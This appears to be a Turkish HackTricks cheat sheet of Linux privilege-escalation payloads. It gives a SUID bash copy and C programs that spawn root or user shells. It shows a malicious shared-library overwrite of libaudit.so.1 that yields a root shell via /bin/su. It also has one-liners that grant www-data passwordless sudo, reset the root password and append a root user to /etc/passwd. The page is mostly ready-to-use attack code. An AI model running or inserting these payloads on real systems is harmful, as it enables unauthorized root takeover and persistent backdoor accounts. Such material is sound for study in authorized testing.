# Çalıştırılacak Payload'lar

{{#include ../../banners/hacktricks-training.md}}

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Privilege escalation için bir dosyanın üzerine yazma

### Yaygın dosyalar

- _/etc/passwd_ dosyasına parolalı kullanıcı ekleme
- _/etc/shadow_ içindeki parolayı değiştirme
- _/etc/sudoers_ dosyasına sudoers kullanıcısı ekleme
- Genellikle _/run/docker.sock_ veya _/var/run/docker.sock_ konumunda bulunan docker socket üzerinden docker'ı kötüye kullanma

### Bir library'nin üzerine yazma

Bir binary tarafından kullanılan bir library'yi kontrol edin; bu örnekte `/bin/su`:
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
Bu durumda `/lib/x86_64-linux-gnu/libaudit.so.1` kimliğine bürünmeyi deneyelim.\
Bu nedenle, **`su`** binary'si tarafından kullanılan bu library'nin function'larını kontrol edin:
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`, `audit_log_acct_message`, `audit_log_acct_message` ve `audit_fd` sembolleri muhtemelen libaudit.so.1 kütüphanesindendir. libaudit.so.1 malicious shared library tarafından üzerine yazılacağından, bu semboller yeni shared library içinde bulunmalıdır; aksi takdirde program sembolü bulamaz ve sonlanır.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Şimdi yalnızca **`/bin/su`** çağırarak root olarak bir shell elde edebilirsiniz.

## Scripts

root'a bir şey çalıştırabilir misiniz?

### **www-data to sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **root parolasını değiştir**
```bash
echo "root:hacked" | chpasswd
```
### /etc/passwd Dosyasına Yeni root Kullanıcısı Ekleme
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
{{#include ../../banners/hacktricks-training.md}}
